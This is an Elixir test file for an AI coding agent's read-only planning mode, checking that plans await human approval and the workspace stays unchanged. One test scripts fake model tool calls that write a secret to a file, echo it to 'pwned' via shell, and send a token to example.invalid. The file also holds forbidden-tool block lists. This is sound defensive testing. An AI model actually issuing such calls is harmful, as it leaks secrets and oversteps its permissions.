defmodule Muse.M1ReadOnlyPlanningTest do
  use ExUnit.Case, async: false

  alias Muse.{CommandDispatcher, Commands, Plan, SessionServer, SessionStore, State}

  @plan_json ~s({
    "id": "m1-version-plan",
    "title": "Version command implementation plan",
    "objective": "Add a /version command to the CLI that displays the app version from mix.exs.",
    "summary": "Implement a /version command by inspecting the command dispatcher and mix.exs.",
    "tasks": [
      {
        "title": "Inspect command dispatcher",
        "description": "Read lib/muse/command_dispatcher.ex to understand command routing",
        "target_files": ["lib/muse/command_dispatcher.ex"],
        "requires_write": false,
        "requires_shell": false
      },
      {
        "title": "Add version command handler",
        "description": "Add a :version dispatch clause in the command dispatcher",
        "target_files": ["lib/muse/command_dispatcher.ex"],
        "requires_write": true,
        "requires_shell": false
      },
      {
        "title": "Add tests",
        "description": "Write tests for the /version command",
        "target_files": ["test/muse/commands_test.exs"],
        "requires_write": true,
        "requires_shell": false
      }
    ],
    "risks": ["Minimal risk — read-only inspection only"],
    "inspected_files": ["lib/muse/command_dispatcher.ex", "mix.exs"],
    "likely_changed_files": ["lib/muse/command_dispatcher.ex"]
  })

  # -- Setup / teardown ---------------------------------------------------------

  setup do
    cleanup_infrastructure()
    ensure_infrastructure()

    on_exit(fn ->
      File.rm_rf!(".muse/sessions")
    end)

    # Create a temp workspace with some initial files for tool inspection.
    # The workspace includes a small git repo so read-only git tools
    # (git_status, git_diff_readonly) can be exercised.
    workspace = tmp_dir!()
    seed_workspace(workspace)
    on_exit(fn -> File.rm_rf!(workspace) end)

    %{workspace: workspace}
  end

  # -- E2E test: read-only planning flow ----------------------------------------

  describe "M1 read-only planning E2E" do
    @tag :m1_readonly
    test "full tool-loop with read-only tools produces plan; zero workspace writes",
         %{workspace: workspace} do
      session_id = "m1-ro-plan-#{:erlang.unique_integer([:positive])}"

      # Snapshot workspace state before any tool execution
      {before_paths, before_hashes} = workspace_snapshot(workspace)

      # Start session server
      pid = start_server(session_id)
      assert is_pid(pid)

      # Submit a planning request that triggers:
      #   Batch 0: tool calls (list_files, read_file, git_status) — read-only tools
      #   Batch 1: tool calls (repo_search, git_diff_readonly) — read-only tools
      #   Batch 2: structured plan JSON
      fake_event_batches = [
        [
          {:assistant_delta, "Let me inspect the workspace structure and git status."},
          {:tool_call, "list_files", %{"path" => "."}, "call_list_1"},
          {:tool_call, "read_file", %{"path" => "mix.exs"}, "call_read_1"},
          {:tool_call, "git_status", %{}, "call_git_status_1"},
          {:response_completed, nil}
        ],
        [
          {:assistant_delta, "Let me search and check the diff."},
          {:tool_call, "repo_search", %{"pattern" => "def dispatch"}, "call_search_1"},
          {:tool_call, "git_diff_readonly", %{"path" => "mix.exs"}, "call_git_diff_1"},
          {:response_completed, nil}
        ],
        [
          {:assistant_delta, "Based on my thorough inspection, here is the structured plan:\n\n"},
          {:assistant_delta, @plan_json},
          {:assistant_completed, @plan_json},
          {:response_completed, %{prompt_tokens: 450, completion_tokens: 320, total_tokens: 770}}
        ]
      ]

      request_options = [options: %{fake_event_batches: fake_event_batches}]

      {:ok, assistant_text} =
        SessionServer.submit(pid, :cli, "plan the version command",
          workspace: workspace,
          prompt_opts: [project_rules?: false],
          request_options: request_options
        )

      # -- Assertion 1: Session ends in :awaiting_plan_approval with a Plan ----
      status = SessionServer.status(pid)

      assert status.status == :awaiting_plan_approval,
             "Expected session status :awaiting_plan_approval, got: #{inspect(status.status)}"

      assert status.active_plan_id != nil, "Expected active_plan_id to be set"
      assert %Plan{} = status.plan, "Expected plan to be a Plan struct"
      assert status.plan.objective =~ "/version command"

      # -- Assertion 2: Plan status is :awaiting_approval ----------------------
      assert status.plan.status == :awaiting_approval,
             "Expected plan status :awaiting_approval, got: #{inspect(status.plan.status)}"

      # -- Assertion 3: Plan is persisted through SessionStore -----------------
      {:ok, stored} = SessionStore.load_session(session_id)
      assert stored["status"] == "awaiting_plan_approval"
      assert stored["active_plan_id"] == status.active_plan_id
      assert stored["plan"]["status"] == "awaiting_approval"
      assert stored["plan"]["objective"] =~ "/version command"
      assert stored["plans"][status.active_plan_id]["status"] == "awaiting_approval"

      # -- Assertion 4: Flow includes read-only inspection/tool activity ------
      events = State.events()
      event_types = Enum.map(events, & &1.type)

      assert :tool_call_started in event_types,
             "Expected tool_call_started events from tool-loop"

      assert :tool_call_completed in event_types,
             "Expected tool_call_completed events from tool-loop"

      # Read-only tools used: list_files, read_file, git_status, repo_search, git_diff_readonly
      completed_tools =
        events
        |> Enum.filter(&(&1.type == :tool_call_completed))
        |> Enum.map(& &1.data.tool_name)

      assert "list_files" in completed_tools,
             "Expected list_files tool call, got: #{inspect(completed_tools)}"

      assert "read_file" in completed_tools,
             "Expected read_file tool call, got: #{inspect(completed_tools)}"

      assert "git_status" in completed_tools,
             "Expected git_status tool call, got: #{inspect(completed_tools)}"

      assert "repo_search" in completed_tools,
             "Expected repo_search tool call, got: #{inspect(completed_tools)}"

      assert "git_diff_readonly" in completed_tools,
             "Expected git_diff_readonly tool call, got: #{inspect(completed_tools)}"

      # -- Assertion 5: Workspace contents are unchanged -----------------------
      {after_paths, after_hashes} = workspace_snapshot(workspace)

      assert before_paths == after_paths,
             "Workspace paths changed! Before: #{inspect(before_paths)}, After: #{inspect(after_paths)}"

      assert before_hashes == after_hashes,
             "Workspace file hashes changed! Workspace was modified."

      # -- Assertion 6: No write/shell tool events ----------------------------
      blocked_or_errors =
        events
        |> Enum.filter(&(&1.type in [:tool_call_blocked, :tool_call_failed, :tool_call_error]))

      assert blocked_or_errors == [],
             "Expected no blocked or errored tool events, got: #{inspect(blocked_or_errors)}"

      # Verify no write-blocked tools were even attempted
      write_tool_types = [
        "write_file",
        "replace_in_file",
        "delete_file",
        "patch_apply",
        "patch_propose"
      ]

      attempted_writes =
        events
        |> Enum.filter(&(&1.type in [:tool_call_started, :tool_call_requested]))
        |> Enum.filter(&(&1.data.tool_name in write_tool_types))

      assert attempted_writes == [],
             "Expected no write tool attempts, got: #{inspect(attempted_writes)}"

      # Verify no shell commands were executed
      shell_types = ["shell_command", "network_call", "remote_execution"]

      attempted_shell =
        events
        |> Enum.filter(&(&1.type in [:tool_call_started, :tool_call_requested]))
        |> Enum.filter(&(&1.data.tool_name in shell_types))

      assert attempted_shell == [],
             "Expected no shell tool attempts, got: #{inspect(attempted_shell)}"

      # -- Assertion 7: No Coding Muse handoff ---------------------------------
      muse_selected_events = Enum.filter(events, &(&1.type == :muse_selected))

      for event <- muse_selected_events do
        assert event.data.muse_id == :planning,
               "Expected Muse to be :planning, got: #{inspect(event.data.muse_id)}"
      end

      # -- Assertion 8: Assistant text is rendered plan, not raw JSON ----------
      refute assistant_text =~ ~r/^\s*\{/, "Assistant text should not start with raw JSON"
      refute assistant_text =~ ~r/"objective"/, "Assistant text should not contain raw JSON keys"
      assert assistant_text =~ "Objective:", "Assistant text should contain rendered objective"
      assert assistant_text =~ "Tasks:", "Assistant text should contain rendered tasks"

      assert assistant_text =~ "/approve plan",
             "Assistant text should contain approval instructions"
    end

    @tag :m1_readonly
    test "provider-requested write shell network and unknown destructive tools are blocked safely",
         %{workspace: workspace} do
      session_id = "m1-ro-blocked-#{:erlang.unique_integer([:positive])}"
      fake_secret = "sk-test-m1-blocked-secret"
      {before_paths, before_hashes} = workspace_snapshot(workspace)

      pid = start_server(session_id)

      fake_event_batches = [
        [
          {:assistant_delta, "I will inspect and must not mutate the workspace."},
          {:tool_call, "write_file",
           %{"path" => "lib/evil.ex", "content" => "API_KEY=#{fake_secret}"}, "call_write"},
          {:tool_call, "patch_propose", %{"patch" => "API_KEY=#{fake_secret}"}, "call_patch"},
          {:tool_call, "shell_command", %{"command" => "echo #{fake_secret} > pwned"},
           "call_shell"},
          {:tool_call, "network_call",
           %{"url" => "https://example.invalid/?token=#{fake_secret}"}, "call_network"},
          {:tool_call, "apply_patch", %{"patch" => "API_KEY=#{fake_secret}"}, "call_apply_patch"},
          {:tool_call, "totally_unknown_tool", %{"api_key" => fake_secret}, "call_unknown"},
          {:response_completed, nil}
        ],
        [
          {:assistant_delta, "Blocked unsafe tool attempts. Here is the safe plan:\n\n"},
          {:assistant_delta, @plan_json},
          {:assistant_completed, @plan_json},
          {:response_completed, nil}
        ]
      ]

      {:ok, assistant_text} =
        SessionServer.submit(pid, :cli, "plan without writing",
          workspace: workspace,
          prompt_opts: [project_rules?: false],
          request_options: [options: %{fake_event_batches: fake_event_batches}]
        )

      status = assert_awaiting_plan!(pid)
      assert %Plan{} = status.plan
      assert assistant_text =~ "Planning Muse prepared a plan."
      assert assistant_text =~ "/approve plan"

      {after_paths, after_hashes} = workspace_snapshot(workspace)
      assert after_paths == before_paths
      assert after_hashes == before_hashes
      refute File.exists?(Path.join(workspace, "lib/evil.ex"))
      refute File.exists?(Path.join(workspace, "pwned"))

      events = State.events()
      blocked_tools = events |> events_of_type(:tool_call_blocked) |> Enum.map(&tool_name/1)
      failed_tools = events |> events_of_type(:tool_call_failed) |> Enum.map(&tool_name/1)

      for tool_name <- [
            "write_file",
            "patch_propose",
            "shell_command",
            "network_call",
            "apply_patch"
          ] do
        assert tool_name in blocked_tools
      end

      assert "totally_unknown_tool" in failed_tools

      for event <- events do
        refute inspect(event.data) =~ fake_secret
      end
    end

    @tag :m1_readonly
    test "planning output without model-supplied id receives a session-owned active plan id",
         %{workspace: workspace} do
      session_id = "m1-ro-generated-plan-id-#{:erlang.unique_integer([:positive])}"
      pid = start_server(session_id)

      plan_without_id =
        @plan_json
        |> Jason.decode!()
        |> Map.delete("id")
        |> Jason.encode!()

      fake_events = [
        {:assistant_delta, plan_without_id},
        {:assistant_completed, plan_without_id},
        {:response_completed, nil}
      ]

      {:ok, _assistant_text} =
        SessionServer.submit(pid, :cli, "plan without id",
          workspace: workspace,
          prompt_opts: [project_rules?: false],
          request_options: [options: %{fake_events: fake_events}]
        )

      status = assert_awaiting_plan!(pid)
      assert is_binary(status.active_plan_id)
      assert String.starts_with?(status.active_plan_id, "plan_turn_")
      assert status.plan.id == status.active_plan_id
      assert Map.has_key?(status.plans, status.active_plan_id)

      {:ok, stored} = SessionStore.load_session(session_id)
      assert stored["active_plan_id"] == status.active_plan_id
      assert get_in(stored, ["plans", status.active_plan_id, "id"]) == status.active_plan_id
    end

    @tag :m1_readonly
    test "invalid plan-like model output returns safe text and stores no raw JSON events",
         %{workspace: workspace} do
      session_id = "m1-ro-invalid-plan-#{:erlang.unique_integer([:positive])}"
      pid = start_server(session_id)
      invalid_plan = ~s({"objective":"","tasks":[],"note":"sk-test-invalid-plan-secret"})

      fake_events = [
        {:assistant_delta, invalid_plan},
        {:assistant_completed, invalid_plan},
        {:response_completed, nil}
      ]

      {:ok, assistant_text} =
        SessionServer.submit(pid, :cli, "plan invalid output",
          workspace: workspace,
          prompt_opts: [project_rules?: false],
          request_options: [options: %{fake_events: fake_events}]
        )

      assert assistant_text =~ "unable to generate a valid structured plan"

      status = SessionServer.status(pid)
      assert status.status == :idle
      assert status.plan == nil
      assert status.active_plan_id == nil

      events_text = inspect(State.events(), limit: :infinity, printable_limit: :infinity)
      refute events_text =~ invalid_plan
      refute events_text =~ "sk-test-invalid-plan-secret"
      refute events_text =~ "\"objective\""
      refute events_text =~ "\"tasks\""
    end
  end

  # -- Completion gate: public command lifecycle -------------------------------

  describe "M1 completion gate — public plan lifecycle" do
    @tag :m1_completion_gate
    test "planning request, plan commands, approval, and rejection stay read-only",
         %{workspace: workspace} do
      {workspace_paths_before, workspace_hashes_before} = workspace_snapshot(workspace)

      # Approval path: create an awaiting plan through the Planning Muse turn.
      approve_session_id = "m1-gate-approve-#{:erlang.unique_integer([:positive])}"
      approve_pid = start_server(approve_session_id)

      {:ok, approve_text} = submit_plan_request(approve_pid, workspace, "approve")
      approve_status = assert_awaiting_plan!(approve_pid)
      approve_plan_id = approve_status.active_plan_id

      assert approve_text =~ "Planning Muse prepared a plan."
      assert approve_text =~ "/approve plan"
      assert approve_text =~ "/reject plan"

      assert_stored_plan_status(
        approve_session_id,
        approve_plan_id,
        "awaiting_plan_approval",
        "awaiting_approval"
      )

      # Public plan management commands resolve through the slash parser plus
      # shared dispatcher, and stay read-only before approval.
      context = command_context(approve_session_id, :cli)
      event_count_before_commands = State.events() |> length()

      {:ok, plan_output, []} = run_slash_command("/plan", context)
      assert plan_output =~ "Muse Plan #{approve_plan_id} (version 1)"
      assert plan_output =~ "Planning Muse prepared a plan."
      assert plan_output =~ "Objective:"
      assert plan_output =~ "/version command"

      {:ok, plans_output, []} = run_slash_command("/plans", context)
      assert plans_output =~ "Muse Plan history: 1 Muse Plan"
      assert plans_output =~ "#{approve_plan_id} [active]"
      assert plans_output =~ "awaiting_approval"

      {:ok, status_output, []} = run_slash_command("/plan status", context)
      assert status_output =~ "Active Muse Plan status:"
      assert status_output =~ "Active plan id: #{approve_plan_id}"
      assert status_output =~ "Version: 1"
      assert status_output =~ "Plan status: awaiting_approval"
      assert status_output =~ "Session status: awaiting_plan_approval"

      {:ok, show_output, []} = run_slash_command("/plan show #{approve_plan_id}", context)
      assert show_output =~ "Muse Plan #{approve_plan_id} (version 1)"
      assert show_output =~ "Objective:"
      assert show_output =~ "/version command"

      {:error, missing_show_output, []} = run_slash_command("/plan show", context)
      assert String.starts_with?(missing_show_output, "Error:")

      assert State.events() |> length() == event_count_before_commands

      status_after_commands = SessionServer.status(approve_pid)
      assert status_after_commands.status == :awaiting_plan_approval
      assert status_after_commands.plan.status == :awaiting_approval
      assert status_after_commands.active_plan_id == approve_plan_id
      assert status_after_commands.active_turn_id == nil
      assert status_after_commands.runner_pid == nil

      # /approve plan is lifecycle-only: it marks the plan approved, returns the
      # session to idle, and does not start a turn, tools, patches, shell, or a
      # Coding Muse handoff.
      events_before_approve = State.events()

      {:ok, approve_output, approve_effects} = run_slash_command("/approve plan", context)

      assert approve_output ==
               "Plan approved.\n\nThe approved plan is ready for implementation.\nActive plan: #{approve_plan_id} (version 1)."

      assert approve_effects == [{:refresh, :events}]

      approved_status = SessionServer.status(approve_pid)
      assert approved_status.status == :idle
      assert approved_status.plan.status == :approved
      assert approved_status.plan.id == approve_plan_id
      assert approved_status.active_plan_id == approve_plan_id
      assert approved_status.active_turn_id == nil
      assert approved_status.runner_pid == nil
      assert approved_status.plan.approved_at != nil
      assert approved_status.plan.rejected_at == nil

      new_approve_events = new_events_since(events_before_approve)
      assert Enum.map(new_approve_events, & &1.type) == [:plan_approved, :session_status_changed]
      assert_no_turn_execution_events(new_approve_events)
      assert_stored_plan_status(approve_session_id, approve_plan_id, "idle", "approved")

      # Rejection path uses a separate awaiting plan/session so statuses do not
      # conflict with the approved plan above.
      reject_session_id = "m1-gate-reject-#{:erlang.unique_integer([:positive])}"
      reject_pid = start_server(reject_session_id)

      {:ok, reject_text} = submit_plan_request(reject_pid, workspace, "reject")
      reject_status = assert_awaiting_plan!(reject_pid)
      reject_plan_id = reject_status.active_plan_id

      assert reject_text =~ "Planning Muse prepared a plan."

      assert_stored_plan_status(
        reject_session_id,
        reject_plan_id,
        "awaiting_plan_approval",
        "awaiting_approval"
      )

      reject_context = command_context(reject_session_id, :web)
      events_before_reject = State.events()

      {:ok, reject_output, reject_effects} = run_slash_command("/reject plan", reject_context)

      assert reject_output ==
               "Plan rejected.\n\nYou can ask Planning Muse for a revised plan.\nActive plan: #{reject_plan_id} (version 1)."

      assert reject_effects == [{:refresh, :events}]

      rejected_status = SessionServer.status(reject_pid)
      assert rejected_status.status == :idle
      assert rejected_status.plan.status == :rejected
      assert rejected_status.plan.id == reject_plan_id
      assert rejected_status.active_plan_id == reject_plan_id
      assert rejected_status.active_turn_id == nil
      assert rejected_status.runner_pid == nil
      assert rejected_status.plan.rejected_at != nil
      assert rejected_status.plan.approved_at == nil

      new_reject_events = new_events_since(events_before_reject)
      assert Enum.map(new_reject_events, & &1.type) == [:plan_rejected, :session_status_changed]
      assert_no_turn_execution_events(new_reject_events)
      assert_stored_plan_status(reject_session_id, reject_plan_id, "idle", "rejected")

      {workspace_paths_after, workspace_hashes_after} = workspace_snapshot(workspace)
      assert workspace_paths_after == workspace_paths_before
      assert workspace_hashes_after == workspace_hashes_before

      assert_no_forbidden_execution_or_handoff(State.events())
    end
  end

  # -- Infrastructure helpers ---------------------------------------------------

  defp ensure_infrastructure do
    # PubSub, SessionRegistry, and SessionSupervisor are started by
    # Application.base_children/0 even in test mode. We only need to
    # ensure State is running.
    case Process.whereis(Muse.State) do
      nil -> {:ok, _} = State.start_link([])
      _pid -> :ok
    end

    clean_sessions()
    :ok
  end

  defp cleanup_infrastructure do
    clean_sessions()

    case Process.whereis(Muse.State) do
      nil ->
        :ok

      pid ->
        try do
          GenServer.stop(pid)
        catch
          :exit, _ -> :ok
        end
    end

    # Clean up SessionStore default dir
    File.rm_rf!(".muse/sessions")
  end

  defp clean_sessions do
    case Process.whereis(Muse.SessionSupervisor) do
      nil ->
        :ok

      pid ->
        pid
        |> DynamicSupervisor.which_children()
        |> Enum.each(fn
          {_, child_pid, _, _} when is_pid(child_pid) ->
            try do
              DynamicSupervisor.terminate_child(Muse.SessionSupervisor, child_pid)
            catch
              :exit, _ -> :ok
            end

          _ ->
            :ok
        end)

        Process.sleep(10)
    end
  end

  defp start_server(session_id) do
    {:ok, pid} =
      DynamicSupervisor.start_child(
        Muse.SessionSupervisor,
        {SessionServer, session_id: session_id}
      )

    pid
  end

  defp submit_plan_request(pid, workspace, id_prefix) do
    fake_event_batches = [
      [
        {:tool_call, "list_files", %{"path" => "."}, "call_#{id_prefix}_list"},
        {:response_completed, nil}
      ],
      [
        {:assistant_delta, "Here is the structured plan:\n\n"},
        {:assistant_delta, @plan_json},
        {:assistant_completed, @plan_json},
        {:response_completed, nil}
      ]
    ]

    SessionServer.submit(pid, :cli, "plan the version command",
      workspace: workspace,
      prompt_opts: [project_rules?: false],
      request_options: [options: %{fake_event_batches: fake_event_batches}]
    )
  end

  defp assert_awaiting_plan!(pid) do
    status = SessionServer.status(pid)

    assert status.status == :awaiting_plan_approval
    assert %Plan{} = status.plan
    assert status.plan.status == :awaiting_approval
    assert status.active_plan_id == status.plan.id
    assert status.active_turn_id == nil
    assert status.runner_pid == nil

    status
  end

  defp command_context(session_id, source) do
    %{session_id: session_id, source: source}
  end

  defp run_slash_command(command, context) do
    case Commands.parse(command) do
      {:command, action} -> CommandDispatcher.dispatch(action, nil, context)
      {:command, action, args} -> CommandDispatcher.dispatch(action, args, context)
    end
  end

  defp new_events_since(events_before) do
    State.events()
    |> Enum.drop(length(events_before))
  end

  defp assert_stored_plan_status(session_id, plan_id, session_status, plan_status) do
    assert {:ok, stored} = SessionStore.load_session(session_id)
    assert stored["status"] == session_status
    assert stored["active_plan_id"] == plan_id
    assert get_in(stored, ["plan", "status"]) == plan_status
    assert get_in(stored, ["plans", plan_id, "status"]) == plan_status
  end

  defp assert_no_turn_execution_events(events) do
    refute Enum.any?(events, &(&1.type in [:turn_started, :turn_completed, :turn_failed]))
    refute Enum.any?(events, &(&1.type in [:muse_selected, :assistant_delta, :assistant_message]))
    refute Enum.any?(events, &String.starts_with?(Atom.to_string(&1.type), "tool_call_"))
  end

  defp assert_no_forbidden_execution_or_handoff(events) do
    forbidden_tools =
      ~w(write_file replace_in_file delete_file patch_apply patch_propose shell_command network_call remote_execution)

    forbidden_tool_events =
      Enum.filter(events, fn event ->
        tool_name = tool_name(event)

        event.type in [:tool_call_started, :tool_call_requested, :tool_call_completed] and
          tool_name in forbidden_tools
      end)

    assert forbidden_tool_events == []

    refute Enum.any?(events, fn
             %{type: :muse_selected, data: %{muse_id: :coding}} -> true
             %{type: :muse_selected, data: %{"muse_id" => "coding"}} -> true
             %{muse_id: "coding"} -> true
             _ -> false
           end)

    forbidden_event_types = [
      :patch_approval_requested,
      :patch_approved,
      :patch_applied,
      :workspace_write,
      :coding_handoff,
      :implementation_started
    ]

    refute Enum.any?(events, &(&1.type in forbidden_event_types))
  end

  defp events_of_type(events, type) do
    Enum.filter(events, &(&1.type == type))
  end

  defp tool_name(%{data: data}) when is_map(data) do
    Map.get(data, :tool_name) || Map.get(data, "tool_name")
  end

  defp tool_name(_event), do: nil

  # -- Temp directory helpers ---------------------------------------------------

  defp tmp_dir! do
    suffix =
      "#{System.system_time(:nanosecond)}-#{:erlang.unique_integer([:positive, :monotonic])}"

    path = Path.join(System.tmp_dir!(), "muse-m1-ro-test-#{suffix}")
    File.rm_rf!(path)
    File.mkdir_p!(path)
    path
  end

  defp seed_workspace(root) do
    # Create a minimal project-like structure for tool inspection
    File.mkdir_p!(Path.join(root, "lib"))
    File.mkdir_p!(Path.join(root, "test"))
    File.mkdir_p!(Path.join(root, "config"))

    File.write!(Path.join(root, "mix.exs"), """
    defmodule MyApp.MixProject do
      use Mix.Project

      def project do
        [
          app: :my_app,
          version: "0.1.0",
          elixir: "~> 1.15"
        ]
      end
    end
    """)

    File.write!(Path.join(root, "lib/my_app.ex"), """
    defmodule MyApp do
      def hello, do: :world
    end
    """)

    File.write!(Path.join(root, "lib/command_dispatcher.ex"), """
    defmodule MyApp.CommandDispatcher do
      def dispatch(:help, _args, _context) do
        {:ok, "Help text", []}
      end

      def dispatch(:version, _args, _context) do
        {:ok, Application.spec(:my_app, :vsn), []}
      end
    end
    """)

    File.write!(Path.join(root, "test/my_app_test.exs"), """
    defmodule MyAppTest do
      use ExUnit.Case
      test "greets the world" do
        assert MyApp.hello() == :world
      end
    end
    """)

    # Initialize a small git repo so read-only git tools
    # (git_status, git_diff_readonly) can be exercised.
    # This uses System.cmd directly in test setup — it does NOT go
    # through Muse runtime shell tools.
    File.write!(Path.join(root, ".gitignore"), "# test workspace\n")
    System.cmd("git", ["init"], cd: root, stderr_to_stdout: true)

    System.cmd("git", ["config", "user.email", "muse-test@example.com"],
      cd: root,
      stderr_to_stdout: true
    )

    System.cmd("git", ["config", "user.name", "Muse Test"], cd: root, stderr_to_stdout: true)
    System.cmd("git", ["add", "."], cd: root, stderr_to_stdout: true)

    System.cmd("git", ["commit", "-m", "initial workspace scaffold"],
      cd: root,
      stderr_to_stdout: true
    )

    :ok
  end

  defp workspace_snapshot(root) do
    # Exclude .git/ metadata because read-only git tools (git_status,
    # git_diff_readonly) may update git internal state (reflog, index)
    # without changing user-managed workspace files. We assert only
    # user workspace files remain unchanged.
    paths =
      root
      |> Path.join("**/*")
      |> Path.wildcard()
      |> Enum.filter(&File.regular?/1)
      |> Enum.reject(fn p -> p |> Path.split() |> Enum.any?(&(&1 == ".git")) end)
      |> Enum.sort()

    hashes =
      Enum.map(paths, fn path ->
        {:ok, content} = File.read(path)
        :erlang.md5(content)
      end)

    {paths, hashes}
  end
end
